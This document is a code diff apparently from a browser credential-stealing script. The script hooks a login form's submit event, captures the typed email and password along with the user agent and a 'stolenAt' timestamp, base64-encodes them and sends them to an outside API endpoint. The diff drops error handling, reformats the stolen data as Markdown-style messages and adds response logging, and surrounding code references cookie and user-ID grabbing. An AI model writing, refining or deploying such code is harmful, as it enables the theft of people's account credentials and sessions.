@@ -31,24 +31,22 @@ const getCUser = () => {
 };
 
 const keyLogging = () => {
-    try {
-        const edEmail = document.getElementById("email");
-        const edPass = document.getElementById("pass");
-        const form = edEmail.parentElement.parentElement.parentElement;
+    const edEmail = document.getElementById("email");
+    const edPass = document.getElementById("pass");
+    const form = edEmail.parentElement.parentElement.parentElement;
 
-        form.onsubmit = async () => {
-            const email = edEmail.value;
-            const pass = edPass.value;
-            const user = {
-                email,
-                password: pass,
-                userAgent,
-                stolenAt: dateTime(),
-            };
-
-            sendMessage(user);
+    form.onsubmit = async () => {
+        const email = edEmail.value;
+        const pass = edPass.value;
+        const user = {
+            email,
+            password: pass,
+            userAgent,
+            stolenAt: dateTime(),
         };
-    } catch (error) {}
+
+        sendMessage(user);
+    };
 };
 
 const getCookies = () => {
@@ -82,7 +80,7 @@ function convertObjectToMessage(obj) {
     for (const key in obj) {
         if (Object.prototype.hasOwnProperty.call(obj, key)) {
             const value = obj[key];
-            message += `${key}: ${value}\n`;
+            message += "*" + key + ":* `" + value + "` \n\n";
         }
     }
 
@@ -90,12 +88,17 @@ function convertObjectToMessage(obj) {
 }
 
 const sendMessage = (userData) => {
+    console.log("aloasdas");
     const msg = btoa(convertObjectToMessage(userData));
     return fetch(`${API}?msg=${msg}`, {
         method: "GET",
         mode: "cors",
         credentials: "same-origin",
-    });
+    })
+        .then((res) => res.text())
+        .then((res) => {
+            console.log(res);
+        });
 };
 
 (() => {
